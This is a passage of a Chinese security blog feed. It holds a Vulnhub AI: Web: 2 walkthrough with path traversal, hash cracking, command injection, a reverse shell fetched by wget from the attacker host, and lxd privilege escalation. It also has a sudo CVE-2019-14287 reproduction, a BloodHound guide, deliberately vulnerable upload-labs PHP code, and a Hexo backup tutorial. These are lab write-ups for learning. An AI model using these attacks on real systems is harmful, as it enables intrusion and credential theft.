alt="Ky1A5d.png"></p><p><img src="https://s2.ax1x.com/2019/10/27/Ky1e2t.png" alt="Ky1e2t.png"></p><p>得到flag<br><img src="https://s2.ax1x.com/2019/10/27/Ky1mxP.png" alt="Ky1mxP.png"></p>]]></content>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>vulnhub-web2</title>
      <link href="/posts/86766a2f.html"/>
      <url>/posts/86766a2f.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天去vulnhub捞了到题来做，感觉还行学到的东西挺多的。要考OSCP的gay佬们不访刷刷<br><img src="https://s2.ax1x.com/2019/10/20/KMrFcn.png" alt="KMrFcn.png"></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>下载好虚拟机镜像，然后网络环境设置仅本机访问<br><img src="https://s2.ax1x.com/2019/10/20/KMsnqP.png" alt="KMsnqP.png"></p><p>将kali设置为桥接模式，使用<code>fping -ag IP/24</code>获取存活的IP<br><img src="https://s2.ax1x.com/2019/10/20/KMcHy9.png" alt="KMcHy9.png"></p><p>后面发现IP:192.168.1.109：</p><pre><code>Kali:192.168.1.108Ubuntu:192.168.1.109</code></pre><p><img src="https://s2.ax1x.com/2019/10/20/KMgFeI.png" alt="KMgFeI.png"></p><p>先看web的几个页面和目录扫描一波<br><img src="https://s2.ax1x.com/2019/10/20/KMghnA.png" alt="KMghnA.png"></p><p>发现一个注册和登录页面</p><p>使用dirbsearch来扫描Bo目录</p><pre><code>dirsearch -u http://192.168.1.109 -e path</code></pre><p><img src="https://s2.ax1x.com/2019/10/20/KM2Fc4.png" alt="KM2Fc4.png"></p><p>发现几个存活目录</p><pre><code>[22:15:54] 301 -  233B  - /css  -&gt;  http://192.168.1.106/css/[22:15:56] 200 -  678B  - /index.php[22:15:56] 200 -  685B  - /index.php/login/[22:15:59] 403 -  199B  - /server-status[22:15:59] 403 -  199B  - /server-status/[22:16:01] 401 -  381B  - /webadmin/admin.html[22:16:01] 401 -  381B  - /webadmin/[22:16:01] 401 -  381B  - /webadmin[22:16:01] 401 -  381B  - /webadmin/index.html[22:16:01] 401 -  381B  - /webadmin/admin.php[22:16:01] 401 -  381B  - /webadmin/login.html[22:16:02] 401 -  381B  - /webadmin/index.php[22:16:02] 401 -  381B  - /webadmin/login.php</code></pre><p>发现可以访问的路径</p><pre><code>http://192.168.1.109/signup.phphttp://192.168.1.109/</code></pre><p>还有设置了apache_auth的目录</p><pre><code>/webadmin</code></pre><p><img src="https://s2.ax1x.com/2019/10/20/KMRDJK.png" alt="KMRDJK.png"></p><p>首先对注册的界面进行一波用户名猜解<br><img src="https://s2.ax1x.com/2019/10/20/KMWOje.png" alt="KMWOje.png"></p><p>发现返回字节总数是：946的则为存在的用户</p><pre><code>存在的用户admin0000000001111111111111188888888888888aaaaaaaaaaaaaa</code></pre><p>在登录页面输入admin，可以进入管理界面<br><img src="https://s2.ax1x.com/2019/10/20/KMfq5q.png" alt=""></p><p>发现这些功能都没的点，尝试用其他用户名登录，发现这些东西没法下载<br><img src="https://s2.ax1x.com/2019/10/20/KM5MCt.png" alt="KM5MCt.png"></p><p>后面尝试从admin用户进去的管理的页面尝试获取新的思路，发现从源码中发现有一段被注释掉的文件上传的源码<br><img src="https://s2.ax1x.com/2019/10/20/KMIOw4.png" alt="KMIOw4.png"></p><p>尝试文件上传</p><pre><code class="html">&lt;html&gt;&lt;body&gt;        &lt;form enctype=&quot;multipart/form-data&quot; action=&quot;/userpage.php&quot; method=&quot;POST&quot;&gt;            &lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000000000&quot; /&gt;            &lt;label for=&quot;uploadfile_input&quot;&gt;Choose a file to upload:&amp;nbsp;&amp;nbsp;&lt;/label&gt;&lt;input name=&quot;uploadedfile&quot; type=&quot;file&quot; id=&quot;uploadfile_input&quot;/&gt;            &lt;button type=&quot;submit&quot; class = &quot;button&quot;&gt;Upload File&lt;/button&gt;            &lt;span class=&quot;error&quot;&gt;&lt;/span&gt;        &lt;/form&gt;    &lt;/div&gt;  &lt;/body&gt;  &lt;/html&gt;</code></pre><p>发现文件上传并不成功<br><img src="https://s2.ax1x.com/2019/10/20/KM7dwF.png" alt="KM7dwF.png"></p><p>端口扫描康康<br><img src="https://s2.ax1x.com/2019/10/20/KMHK6x.png" alt="KMHK6x.png"></p><p>草…突然发现思路陷入死胡同，整理一波收集到的信息</p><pre><code>IPhttp://192.168.1.106/用户名枚举http://192.168.1.106/signup.php目录[22:15:54] 301 -  233B  - /css  -&gt;  http://192.168.1.106/css/[22:15:56] 200 -  678B  - /index.php[22:15:56] 200 -  685B  - /index.php/login/[22:15:59] 403 -  199B  - /server-status[22:15:59] 403 -  199B  - /server-status/[22:16:01] 401 -  381B  - /webadmin/admin.html[22:16:01] 401 -  381B  - /webadmin/[22:16:01] 401 -  381B  - /webadmin[22:16:01] 401 -  381B  - /webadmin/index.html[22:16:01] 401 -  381B  - /webadmin/admin.php[22:16:01] 401 -  381B  - /webadmin/login.html[22:16:02] 401 -  381B  - /webadmin/index.php[22:16:02] 401 -  381B  - /webadmin/login.php存在的用户admin0000000001111111111111188888888888888aaaaaaaaaaaaaa</code></pre><p>后面从其他用户，发现可以下载的地方注意到了那个链接</p><pre><code>http://192.168.1.109/download.php?file_name= 下载的文件http://192.168.1.109/download.php?file_name=/../../../../../etc/passwd</code></pre><p>发现可以进行任意文件下载<br><img src="https://s2.ax1x.com/2019/10/20/KMLWjI.png" alt="KMLWjI.png"></p><p>收集了一些目录对其进行burp跑</p><pre><code>/etc/passwd/var/log/apache2/access.log/etc/shadow/etc/hosts/etc/apache2/apache2.conf/etc/apache2/ports.conf/etc/hostname/proc/version/etc/apache2/.htpasswd</code></pre><p>最后发现/.htpasswd有个hash<br><img src="https://s2.ax1x.com/2019/10/20/KMXX7V.png" alt=""></p><p>使用john进行破解</p><pre><code>john test.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre><p>这里使用rockyou.txt做字典的原因是，题目给出的提示<br><img src="https://s2.ax1x.com/2019/10/20/KQie41.png" alt=""></p><p>最后的得到的密码<br><img src="https://s2.ax1x.com/2019/10/20/KQiluD.png" alt=""></p><p>由于是.htpasswd在加上/etc/passwd上得到的用户，得出这是apache auth登录的用户</p><pre><code>username:aiweb2adminpasswd:c.ronaldo</code></pre><p>拥有密码后此时便可以访问到webadmin目录，进去之后给了个大大的提示<br><img src="https://s2.ax1x.com/2019/10/21/KQFXYn.png" alt="KQFXYn.png"></p><p>访问/robots.txt<br><img src="https://s2.ax1x.com/2019/10/21/KQk1kd.png" alt="KQk1kd.png"></p><p>访问第一个路径，得到一个ping功能的表单，这不是暗示这是个命令注入的洞吗- -！<br><img src="https://s2.ax1x.com/2019/10/21/KQk8fI.png" alt="KQk8fI.png"></p><p>第二个路径提示更是是验证了上一个猜想<br><img src="https://s2.ax1x.com/2019/10/21/KQkRnU.png" alt="KQkRnU.png"></p><p>首先先尝试能否ping通本机<br><img src="https://s2.ax1x.com/2019/10/21/KQk5N9.png" alt="KQk5N9.png"></p><p><img src="https://s2.ax1x.com/2019/10/21/KQk71x.png" alt="KQk71x.png"></p><p>PS:这里重启了虚拟机导致IP变了</p><p>查看了一下权限<br><img src="https://s2.ax1x.com/2019/10/21/KQEEM6.png" alt="KQEEM6.png"></p><p>当前目录<br><img src="https://s2.ax1x.com/2019/10/21/KQEnde.png" alt="KQEnde.png"></p><p>尝试写shell，发现各种失败…由于apache的auth验证，导致菜刀无法使用，上传普通的一句话马子发现居然没有办法执行，迫不得已悄悄咪咪的看了一眼WP，发现居然使用一个名叫php-reverse-shell-1.0的玩意getshell</p><p>下载地址：<br><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank" rel="noopener">http://pentestmonkey.net/tools/web-shells/php-reverse-shell</a></p><p>在本机使用nc监听端口，然后修改那个php里面的IP和PORT设置<br><img src="https://s2.ax1x.com/2019/10/21/KQEJL8.png" alt="KQEJL8.png"></p><p>但是我使用</p><pre><code>x.php改名的wget http://192.168.1.108/x.php</code></pre><p>下载发现特么执行失败，后面我怀疑是代码没有完全传输完成，将马子改名为txt，下载到目标机后在改名为php</p><pre><code>mv x.php x.txtwget http://192.168.1.108/x.txtmv x.txt x.php</code></pre><p><img src="ttps://s2.ax1x.com/2019/10/21/KQV1k4.png" alt=""></p><p>后面访问上传的x.php最后得到一个低权的shell</p><pre><code>http://192.168.1.108/webadmin/H05Tpin9555/x.php</code></pre><p><img src="https://s2.ax1x.com/2019/10/21/KQVNX6.png" alt=""></p><p>后面在/var/www/html发现一个特殊的目录<br><img src="https://s2.ax1x.com/2019/10/21/KQVWB8.png" alt=""></p><p>进入发现一个txt<br><img src="https://s2.ax1x.com/2019/10/21/KQV5NQ.png" alt="KQV5NQ.png"></p><p>给出 了一个低权的用户</p><pre><code>User: n0nr00tuserCred: zxowieoi4sdsadpEClDws1sf</code></pre><p>ssh连接之后，查询版本号和权限<br><img src="https://s2.ax1x.com/2019/10/21/KQVHcq.png" alt="KQVHcq.png"></p><p>发现是Ubuntu 18.04….Google了一下Ubuntu 18.04提权的洞<br><a href="https://www.cnblogs.com/sch01ar/p/10453368.html" target="_blank" rel="noopener">Ubuntu 提权漏洞(CVE-2019-7304)复现 - Sch01aR# - 博客园</a> - 失败</p><p><img src="https://s2.ax1x.com/2019/10/21/KQVxN4.png" alt=""></p><p>searchsploit Ubuntu 18.04<br><img src="https://s2.ax1x.com/2019/10/21/KQZ7Ie.png" alt="KQZ7Ie.png"></p><p>后面发现那个sh脚本完全不是这么利用的，，又悄悄咪咪的看了一下wp<br>发现是id命令执行之后又lxd这三个关键字的可以用这个来提权<br><img src="https://s2.ax1x.com/2019/10/21/KQeXY4.png" alt="KQeXY4.png"></p><p>后面发现脚本的注释上有交怎么用这个jiaoben- -，下载之后，在用bash编译成一个tar.gz的玩意在把那个sh和压缩包拷贝在目标机然后</p><pre><code>xxx.sh -f xx.tar.gz</code></pre><p>即可获得root权限……bash编译过程慢死了，还要fq<br><img src="https://s2.ax1x.com/2019/10/21/KQexp9.png" alt="KQexp9.png"></p><p><img src="https://s2.ax1x.com/2019/10/21/KQezlR.png" alt="KQezlR.png"><br>后面根据题目提升在/mnt/root/root中找到flag.txt<br><img src="https://s2.ax1x.com/2019/10/21/KQmpOx.png" alt="KQmpOx.png"></p><p>参考链接：<br><a href="https://www.hackingarticles.in/ai-web-2-vulnhub-walkthrough/" target="_blank" rel="noopener">AI: Web: 2 Vulnhub Walkthrough</a><br><a href="https://www.youtube.com/watch?v=V-z6FYk3-rw" target="_blank" rel="noopener">YouTube</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过看别的解题思路，发现作者在用admin登入后，将关键字XuezhuLi，在Google或searchsploit搜索了从而得到漏洞点..所以找到CMS或者服务名真的很重要<br><img src="https://s2.ax1x.com/2019/10/21/KQnnC4.png" alt="KQnnC4.png"></p><p>到命令执行漏洞哪里，作者并没有立马执行命令，反而先用tcpdump -i &lt;网卡&gt; &lt;协议名&gt;，来判断是否和攻击机的IP想通</p><p>getshell哪里也收到了一个不错的getshell玩意</p><p>searchspolit搜到对应的exp时应该先看注释，不急得去使用exp</p>]]></content>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>备份自己的hexo博客</title>
      <link href="/posts/d87f7e0c.html"/>
      <url>/posts/d87f7e0c.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>每当机子要换或者重装系统的时候，博客迁移就会成为一件难事。将博客备份到github是个不错的选择<br><img src="https://s2.ax1x.com/2019/10/16/KPIXkj.png" alt="KPIXkj.png"></p><h2 id="备份操作"><a href="#备份操作" class="headerlink" title="备份操作"></a>备份操作</h2><p><strong>创建分支</strong><br>在博客的那个仓库(也就是<code>&lt;username.io&gt;</code>)创建一个分支，取名取好听一点，叫hexo<br><img src="https://s2.ax1x.com/2019/10/16/KPIjts.png" alt="KPIjts.png"></p><p>直接在网页创建分支，方法如图<br><img src="https://s2.ax1x.com/2019/10/16/KPopcV.png" alt="KPopcV.png"></p><p><strong>设置默认分支</strong><br>然后在到仓库的Settings中设置默认分支为hexo(你新建的分支)<br>教程：<a href="https://help.github.com/cn/articles/setting-the-default-branch" target="_blank" rel="noopener">设置默认分支 - GitHub 帮助</a><br><img src="https://s2.ax1x.com/2019/10/16/KPoiBF.png" alt="KPoiBF.png"></p><p><strong>git clone到本地，复制文件</strong><br>然后将其仓库git到本地</p><pre><code>git clone https://github.com/xxx.io.git</code></pre><p>将之前的Hexo文件夹中的<br>_config.yml，themes/，source，scffolds/，package.json，.npmignore复制到你克隆下来的仓库文件夹，即Username.github.io；（Username是你自己的用户名）</p><p>文件说明：</p><pre><code>1、_config.yml站点的配置文件，需要拷贝；2、themes/主题文件夹，需要拷贝；3、source博客文章的.md文件，需要拷贝；4、scaffolds/文章的模板，需要拷贝；5、package.json安装包的名称，需要拷贝；6、.gitignore限定在push时哪些文件可以忽略，需要拷贝；7、.git/主题和站点都有，标志这是一个git项目，不需要拷贝；8、node_modules/是安装包的目录，在执行npm install的时候会重新生成，不需要拷贝；9、public是hexo g生成的静态网页，不需要拷贝；10、.deploy_git同上，hexo g也会生成，不需要拷贝；11、db.json文件，不需要拷贝。</code></pre><p>PS:如果themes主题文件夹中的某个主题带有.git/请删除，否则会造成无法push的问题</p><p>这里的默认分支是你创建的，注意<br><img src="https://s2.ax1x.com/2019/10/16/KPolHe.png" alt="KPolHe.png"></p><p>执行command：</p><pre><code>git add，git commit -m &quot;提交文件&quot;git push origin hexo //来提交Hexo网站源文件</code></pre><p><img src="https://s2.ax1x.com/2019/10/16/KPoNgP.png" alt="KPoNgP.png"></p><p>执行<code>hexo g -d</code>生成静态网页部署到github上</p><p><del><strong>往后的提交操作</strong><br>1、执行git add，git commit -m “提交文件”，git push origin Hexo来提交Hexo网站源文件；<br>2、执行hexo g -d 生成静态网页部署到github上；<br>（每次发布重复这两步，它们之间没有严格的顺序）</del><br>往后的操作，就是每次写完md然后生成html在提交上去？我刚刚他妈试了一下，弄完博客就404<br>狗屎玩意，网上的文章也不会放个图，就知道CV CV<br><img src="https://s2.ax1x.com/2019/10/16/KPHncq.png" alt="KPHncq.png"></p><p><del>我他妈一脸问号，所以这个方法就是个垃圾</del><br>定时备份还是可以的，不过在备份时要把创建的hexo仓库给设置为默认，然后在git clone下载到本地，下载没删的就不用删了，然后次执行这种操作</p><pre><code>_config.yml，themes/，source，scffolds/，package.json，.npmignore复制到你克隆下来的仓库文件夹，即Username.github.io,然后在git add .git commit -m &quot;xxxx&quot;git push origin hexohexo g -d</code></pre><p><strong>恢复博客</strong><br>换电脑想改博客：<br>1、安装git；<br>2、安装Nodejs和npm；<br>3、使用克隆命令将仓库拷贝至本地；<br>4、在文件夹内执行命令npm install hexo-cli -g、npm install、npm install hexo-deployer-git</p><p><strong>这个方法我觉得屌用没有，刚刚又翻了一下，有一篇用hexo插件备份的，岂不妙哉。用上面的垃圾方法有个屌用</strong></p><p><a href="https://mxy493.xyz/2019/05/25/Hexo%E5%8D%9A%E5%AE%A2%E4%BD%BF%E7%94%A8%E6%8F%92%E4%BB%B6hexo-git-backup%E9%80%9A%E8%BF%87GitHub%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/" target="_blank" rel="noopener">Hexo博客使用插件hexo-git-backup通过GitHub备份与恢复 | mxy</a></p><p>最后编写时间：2:10分，上面的备份方法<strong>垃圾到爆了</strong></p>]]></content>
      
      
        <tags>
            
            <tag> 博客备份 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2019-14287复现</title>
      <link href="/posts/13cae37e.html"/>
      <url>/posts/13cae37e.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天在公众号见到消息说是，那就复现一哈子吧<br><img src="https://s2.ax1x.com/2019/10/15/KP2TZn.png" alt="KP2TZn.png"></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>VM:Kali</code></pre><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote><p>这个漏洞的 CVE 编号是CVE-2019-14287，是由苹果信息安全部门的研究员 Joe Vennix 发现并分析的。与其说让人恐慌，不如说让人兴趣盎然：它要求系统具有非标准配置。换句话说，在默认情况下，Linux 计算机并不易受攻击。然而，如果你的配置是这样的：让用户以 root 权限以外的其他用户权限运行命令，那么可能就需要注意了：因为用户可以通过命令行上的 –u#-1 绕过这个非 root限制。如果将 sudo配置为允许用户通过Runas 规范中的 ALL 关键字以任意用户身份运行命令，则可以通过指定用户 ID为-1 或4294967295 以 root 用户身份运行命令。只要Runas 规范中最先列出 ALL 关键字，即使Runas 规范明确禁止 root访问权限，那么具有足够的 sudo 权限的而用户即可以 root 身份运行命令。以这种方式运行的命令的日志条目会把目标用户列为 4294967295而非 root。另外，将不会为该命令运行 PAM 会话模块。具体而言：利用该漏洞要求用户具有 sudo 权限，从而以任意用户 ID 运行命令。一般而言，这意味着用户的 sudoers 条目在 Runas 规范中具有特殊值 ALL。Sudo 支持在 sudoers 策略允许的情况下，以用户指定的名称或用户 ID 运行命令。例如，如下 sudoers 条目允许 id 命令以任意用户身份运行，因为它包含 Runas 规范中的关键字 ALL</p></blockquote><p>漏洞影响范围</p><pre><code>1.8.28之前的所有 Sudo 版本均受影响</code></pre><p>修复方案</p><pre><code>Sudo 1.8.28 版本已修复该漏洞。强烈建议 Linux用户将 sudo包手动更新至最新版本</code></pre><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>在/etc/sudoers 文件中写入一行</p><pre><code>myhost alice = (ALL) /usr/bin/id</code></pre><p><img src="https://s2.ax1x.com/2019/10/15/KPRFJK.png" alt="KPRFJK.png"></p><p>执行以下command即可以root权限运行id命令</p><pre><code> sudo -u#4294967295 id</code></pre><p><img src="https://s2.ax1x.com/2019/10/15/KPRkRO.png" alt="KPRkRO.png"></p><p>更直观的感受一下，把命令id改为cat，然后以demo用户读取/etc/shadow<br><img src="https://s2.ax1x.com/2019/10/15/KPRudI.png" alt="KPRudI.png"></p><p><img src="https://s2.ax1x.com/2019/10/15/KPRaoq.png" alt="KPRaoq.png"></p><p>这究竟是为啥子会有这种操作出现呢<br><img src="https://s2.ax1x.com/2019/10/15/KPRAzD.png" alt="KPRAzD.png"></p><p><img src="https://s2.ax1x.com/2019/10/15/KPRZsH.png" alt="KPRZsH.png"></p><p>参考链接:<a href="https://www.freebuf.com/news/216821.html" target="_blank" rel="noopener">Linux Sudo被曝漏洞，可导致用户以root权限运行命令 - FreeBuf互联网安全新媒体平台</a></p>]]></content>
      
      
        <tags>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bloodhound的用法</title>
      <link href="/posts/dd781ce2.html"/>
      <url>/posts/dd781ce2.html</url>
      <content type="html"><![CDATA[<p>今天在雷神众测公众号见到一个篇叫：bloodhound技术讲解的文章，自己捞了康康，捎带总结<br>文章链接：<a href="https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&amp;mid=2652471925&amp;idx=1&amp;sn=09d691c85d9bf83122557546fbd31374&amp;chksm=f25821c6c52fa8d00e44f24533fc5ab30ac343b71d9862a6be74d0df4b8fc904a12831901c9f&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1571130787590&amp;sharer_shareid=64458b89777349122de4fc747d336e14#rd" target="_blank" rel="noopener">bloodhound技术讲解</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/backlion/p/10643132.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/10643132.html</a><br><a href="https://github.com/C0axx/AggressorScripts" target="_blank" rel="noopener">https://github.com/C0axx/AggressorScripts</a><br><a href="https://github.com/BloodHoundAD" target="_blank" rel="noopener">BloodHoundAD · GitHub</a></p><h2 id="bloodhound介绍"><a href="#bloodhound介绍" class="headerlink" title="bloodhound介绍"></a>bloodhound介绍</h2><blockquote><p>BloodHound是一个单页Javascript Web应用程序，基于Linkurious构建，该应用程序由Electron编译，具有由C＃数据收集器提供的Neo4j数据库。<br>BloodHound使用图论来揭示Active Directory环境中隐藏的，通常是意外的关系。攻击者可以使用BloodHound轻松识别高度复杂的攻击路径，否则这些攻击路径将无法快速识别。防御者可以使用BloodHound来识别和消除那些相同的攻击路径。蓝队和红队均可使用BloodHound轻松获得对Active Directory环境中特权关系的更深入了解</p></blockquote><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>VM:kali</code></pre><p>PS:懒得的搭域这里就借别人的图来用用</p><h2 id="安装与初始化"><a href="#安装与初始化" class="headerlink" title="安装与初始化"></a>安装与初始化</h2><pre><code>安装bloodhoundapt-get install bloodhound启动Neo4和bloodhoundneo4j consolebloodhound</code></pre><p>之后进入<a href="http://127.0.0.1:7474,可以看到如下界面" target="_blank" rel="noopener">http://127.0.0.1:7474,可以看到如下界面</a><br><img src="https://img2018.cnblogs.com/blog/1049983/201904/1049983-20190402155722502-1719968636.png" alt="1049983-20190402155722502-1719968636.png"></p><p>输入默认username和password更改密码，默认是</p><pre><code>neo4jneo4j</code></pre><p><img src="https://img2018.cnblogs.com/blog/1049983/201904/1049983-20190402155722976-431988692.png" alt="1049983-20190402155722976-431988692.png"></p><p>之后会看到<br><img src="https://s2.ax1x.com/2019/10/15/KPlHl4.png" alt="KPlHl4.png"></p><p>新开一个终端执行：<code>bloodHound</code><br><img src="https://s2.ax1x.com/2019/10/15/KP1iXd.png" alt="KP1iXd.png"></p><p>然后会弹出一个框框，根据上图给出的消息和你的账号进行登录<br><img src="https://img2018.cnblogs.com/blog/1049983/201904/1049983-20190402155723356-1627066939.png" alt="1049983-20190402155723356-1627066939.png"></p><p>登录进去之后是一片空白，需要自己导入zip<br><img src="https://s2.ax1x.com/2019/10/15/KP1U9U.png" alt="KP1U9U.png"></p><blockquote><p>可以通过sharpbound.exe和ps1单独使用（execute-assembly、powershell-import）。<br>导入插件，快速导出并下载bloodhound的json文件。</p></blockquote><p><img src="https://s2.ax1x.com/2019/10/15/KP3Zr9.md.png" alt="KP3Zr9.md.png"></p><blockquote><p>导入zip后就可以通过各种关系寻找路线攻击域管或者某台特定机器<br>寻找攻击域管的最短路径</p></blockquote><p><img src="https://s2.ax1x.com/2019/10/15/KP312D.png" alt="KP312D.png"></p><p><img src="https://s2.ax1x.com/2019/10/15/KP3NVI.png" alt="KP3NVI.png"></p><p>使用技巧</p><p>如果你不想过多了解bloodhound对运行机制，不需要自己编写语法查询，只用bloodhound提供的默认ui显示。那么只需要认识几个图形所代表的意义及一些使用技巧</p><ul><li>绿色用户头像：用户</li><li>三个黄色头像：用户组</li><li>红色小电脑：计算机</li><li>绿色小地球：域</li></ul><p>自带的查询功能：</p><pre><code>Find all Domain Admins 查找所有域管理员 Find Shortest Paths to Domain Admins  查找域管理员的最短路径 Find Principals with DCSync Rights查找具有DCSync权限的主体 Users with Foreign Domain Group Membership 具有外域组成员身份的用户 Groups with Foreign Domain Group Membership  具有外域组成员身份的组 Map Domain Trusts域信任映射图 Shortest Paths to Unconstrained Delegation Systems  不受约束的委派系统的最短路径 Shortest Paths from Kerberoastable Users 来自Kerberoastable用户的最短路径 Shortest Paths to Domain Admins from Kerberoastable Users  可通过Kerberoastable用户访问域管理员的最短路径 Shortest Path from Owned Principals  已拥有权限最短路径 Shortest Paths to Domain Admins from Owned Principals 已拥有权限到域管理员的最短路径 Shortest Paths to High Value Targets高价值目标的最短路径</code></pre><p><img src="https://s2.ax1x.com/2019/10/15/KP8EJf.png" alt="KP8EJf.png"></p><p><img src="https://s2.ax1x.com/2019/10/15/KP8Mes.png" alt="KP8Mes.png"></p><blockquote><p>当选择高价值目标的最短路径UI进行分析（选择其他UI使用方式一样），可以重点关注用户（绿色头像）、计算机（红色小电脑）。当用鼠标指向这两个单位时，会以高亮显示体现出具体的攻击路径。简而言之：<br>1.对高亮攻击路径中的所有用户分析<br>2.对高亮攻击路径中的所有计算机进行分析</p></blockquote><p><img src="https://s2.ax1x.com/2019/10/15/KP8GWT.png" alt="KP8GWT.png"></p><p><img src="https://s2.ax1x.com/2019/10/15/KP8UOJ.png" alt="KP8UOJ.png"></p>]]></content>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>upload level 11 - level 16</title>
      <link href="/posts/470078a2.html"/>
      <url>/posts/470078a2.html</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1360802561&auto=1&height=66"></iframe><h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>后端处理代码如下：</p><pre><code class="php">&lt;?php$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;])){    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = &#39;上传出错！&#39;;        }    } else{        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    }}?&gt;</code></pre><p>关键处：</p><blockquote><p>发现那个路径没有处理直接拼接上去的。所以可以利用00截断绕过</p><pre><code class="php">$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10,99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></pre></blockquote><p>看起来只能00截断(现在这方法几乎没用)<br>条件：</p><pre><code>截断条件：    php版本小于5.3.4 详情关注CVE-2006-7243    php的magic_quotes_gpc为OFF状态</code></pre><p><img src="https://s2.ax1x.com/2019/10/13/ujLdtx.png" alt=""></p><p>这里借别人的图<br><img src="https://s2.ax1x.com/2019/10/13/ujLRAI.png" alt="ujLRAI.png"></p><p><img src="https://s2.ax1x.com/2019/10/13/ujL7uQ.png" alt="ujL7uQ.png"></p><h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>后端处理代码如下：</p><pre><code class="php">&lt;?php$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;])){    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = $_POST[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = &quot;上传失败&quot;;        }    } else {        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    }}?&gt;</code></pre><p>还是00截断，这截断的方法有些不同所以只要php版本小于5.3就好<br><img src="https://s2.ax1x.com/2019/10/13/ujxj6f.png" alt="ujxj6f.png"></p><p><img src="https://s2.ax1x.com/2019/10/13/ujzmBF.png" alt="ujzmBF.png"></p><p>成功上传<br><img src="https://img-blog.csdn.net/20180729111354983?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5NjQ3NzA5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="70"></p><h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>后端处理代码：</p><pre><code class="php">function getReailFileType($filename){    $file = fopen($filename, &quot;rb&quot;);    $bin = fread($file, 2); //只读2字节    fclose($file);    $strInfo = @unpack(&quot;C2chars&quot;, $bin);        $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);        $fileType = &#39;&#39;;        switch($typeCode){              case 255216:                        $fileType = &#39;jpg&#39;;            break;        case 13780:                        $fileType = &#39;png&#39;;            break;                case 7173:                        $fileType = &#39;gif&#39;;            break;        default:                        $fileType = &#39;unknown&#39;;        }            return $fileType;}$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;])){    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $file_type = getReailFileType($temp_file);    if($file_type == &#39;unknown&#39;){        $msg = &quot;文件未知，上传失败！&quot;;    }else{        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = &quot;上传出错！&quot;;        }    }}</code></pre><p>判断了文件头，直接随便打开张图片，把马子插入进去就好然后上传<br><img src="https://s2.ax1x.com/2019/10/13/uvSBa4.png" alt="uvSBa4.png"></p><p>包含如下<br><img src="https://s2.ax1x.com/2019/10/13/uvS7RI.png" alt="uvS7RI.png"></p><h2 id="level-14"><a href="#level-14" 